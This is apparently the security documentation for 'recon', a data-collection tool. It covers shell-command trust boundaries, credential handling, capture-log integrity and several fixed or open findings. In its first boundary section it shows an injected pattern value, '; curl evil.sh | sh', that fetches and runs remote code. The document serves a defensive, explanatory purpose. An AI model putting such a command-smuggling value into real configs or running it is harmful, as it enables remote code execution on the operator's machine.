# Security — recon

recon collects from heterogeneous sources — HTTP APIs, local CLIs, web pages, capture logs
— and normalises the results to JSONL. Two things make it worth reading before you run
someone else's config: **a recon config runs shell commands**, and recon handles source
credentials.

Audience: anyone running `recon survey` against a config they did not write.

**Read the plan first.** `recon survey <mission> --dry-run` validates the config and lists
every run it would make — the exact substituted shell commands, the URLs, and each run's
declared effects (network, subprocess, filesystem) — without fetching, executing or writing
anything. Reviewing a config means reviewing that plan.

## Blast radius

A survey may execute arbitrary shell commands, make outbound HTTP requests carrying your
credentials, and write files under the mission directory (`.recon/<mission>/`).

## Trust boundaries

### 1. Config file → shell (`cli` collector)

`PopenRunner.run_lines` executes with `shell=True`. The command string is built by
`substitute(entry.run, {"url": ..., "pattern": ...})` — string interpolation with **no
quoting**. Both `entry.run` and `entry.patterns` come from the config; `url` comes from
the referenced source entry.

**A recon config is executable. Reviewing one is reviewing a shell script.** A `pattern`
containing `; curl evil.sh | sh` runs. This is not a defect to be fixed by quoting: the
whole point of `run:` is to invoke a local tool with operator-chosen arguments, and
quoting it would break the feature. It is a boundary to be *known*. `--dry-run` prints
every substituted command, which is the place to read them.

What constrains it:

- The child starts in its own process group (`os.setsid` on POSIX), so a timeout kills the
  whole tree rather than only the shell — a runaway pipeline cannot outlive the run.
- `source.timeout` bounds the command (default 300s).

What does **not** constrain it: nothing restricts which binaries run, what they touch, or
where they connect. There is no allowlist. Declared effects are what a collector type says
about itself; recon reports them and does not enforce them.

### 2. Source entries → outbound credentials (`api` collector)

A source entry names an environment variable holding its secret (`auth.env`), read through
an injected `Mapping` that defaults to `os.environ`. It is sent as a header (`auth.header`),
a query parameter (`auth.param`), or both. Two consequences:

- The secret is attached to requests to **whatever URL that source declares**. A config
  that points a credentialed source at an attacker's host exfiltrates the credential. The
  URL and the credential are chosen by the same file. The dry-run plan shows each URL.
- Secrets are never written to the JSONL output and never logged. Request headers are
  never persisted. In captures, response headers are persisted with credential-bearing
  values redacted (R-2), and an `auth.param` value is redacted from the captured URL (R-4).

An unset `auth.env` variable sends the request without credentials; the plan warns about
it before anything is sent.

The injectable `env` mapping exists so tests never touch the real environment; it is also
the seam for scoping which variables a run can see.

### 3. Remote responses → local files

Collected records are attacker-influenced data by definition. recon writes them as JSONL
values, never as paths or commands. Output filenames come from the collector entry's
`name` in the config, not from response content. Capture bodies are named by their own
sha256, never by anything in the response.

### 4. Capture logs → the capture collector

A capture log (`captures.jsonl`, format `recon.v1.capture`) may be written by tools other
than recon, so the `capture` collector trusts nothing in it that names a file. A line's
`body` must be exactly `raw/<sha256>` relative to the log — no other path, absolute or
relative, is opened — and the bytes must hash to that sha256. A line that fails either
check stops the table with an error naming the file and line.

### 5. Claude Code hook → `recon capture`

`recon capture <mission>` appends whatever `PostToolUse` payload arrives on stdin. The
payload's `tool_response` is stored verbatim and its other fields (`tool_input`,
`session_id`, `cwd`, ...) become the capture's `request`. A captured MCP result can contain
anything the tool saw, including private data, so `.recon/<mission>/captures/` deserves the
same care as the conversation transcript. `recon capture` writes only under an existing
mission's directory; it refuses (exit 4) when the mission does not exist, rather than
creating one from a name it was handed.

## Findings

### R-1 — generator cleanup silenced to satisfy the type checker (fixed 2026-08-17)

`_sink` wraps its record stream in `contextlib.closing(records)`. During the strict-typing
pass the wrapper was removed because the parameter was typed `Iterable`, which
`closing()` rejects.

That wrapper is load-bearing, not decoration. `_sink` consumes a generator that may hold
an open subprocess pipe or HTTP connection; if the consumer raises partway, `closing()` is
what runs the generator's `finally` and releases it. Without it a failed collect leaks a
file descriptor and can leave a child process running.

Fixed by typing the parameter `Generator[dict[str, Any], None, None]` — the type it
actually is — so `closing()` type-checks and stays.

**Note on the regression test:** the first test written for this passed *with the bug
present* and was worthless. The discriminating case is a **suspended** generator (one with
a live `finally`) plus a **consumer that raises** — only that combination distinguishes
"cleanup happened" from "the generator was exhausted anyway".

### R-2 — raw capture persisted `Set-Cookie` verbatim (fixed 2026-08-18)

With `preserve_raw: true`, the raw capture wrote every response header to disk
unfiltered. A server that issued a session cookie put a **live credential** into a file
whose whole purpose is to be kept, committed, and shared — the audit artefact was the leak.

Fixed: `redact_headers` replaces the values of a named set (`set-cookie`, `authorization`,
`x-api-key`, …), matched case-insensitively. The **key is preserved** so the capture still
proves the server set a cookie; only the value is gone. Dropping the header outright would
have destroyed the evidence the file exists to hold. Since 0.9.0 the redaction applies to
every line of the capture log (`captures.jsonl`).

Regression: `recon/tests/test_capture_log.py`.

### R-3 — CLI capture records the substituted command (open, by design)

A `cli` capture records the fully-substituted commands in its `request`. That is the point
— it is what makes a CLI capture reproducible. But a config that inlines a secret
(`run: curl -H 'Authorization: Bearer sk-...'`) puts that secret on disk.

Not fixed, and not fixable by redaction without guessing at shell syntax and breaking
reproducibility. **Keep credentials in environment variables referenced by a source's
`auth.env`, never inline in a `run:` string.** If you must inline one, treat the archive
as secret material.

### R-4 — `auth.param` would have put the key in the captured URL (prevented, 0.9.0)

`auth.param` sends the credential in the query string, and the response URL — which a
capture records — carries the query string. Implementing `auth.param` without care would
have written the key into every capture. The `api` collector replaces that parameter's
value in the captured URL with the redaction marker before recording it.

Regression: `test_param_key_never_reaches_the_capture_log` in
`recon/tests/test_api_collector.py`.

## Not covered

- No sandboxing of collector commands. See boundary 1.
- No egress allowlist. A source may point anywhere.
- No TLS pinning; recon uses the platform trust store.
- Declared collector effects are not enforced.

## Reporting

Open an issue on the gnx repository. Pre-gen-0 component; no embargo channel.
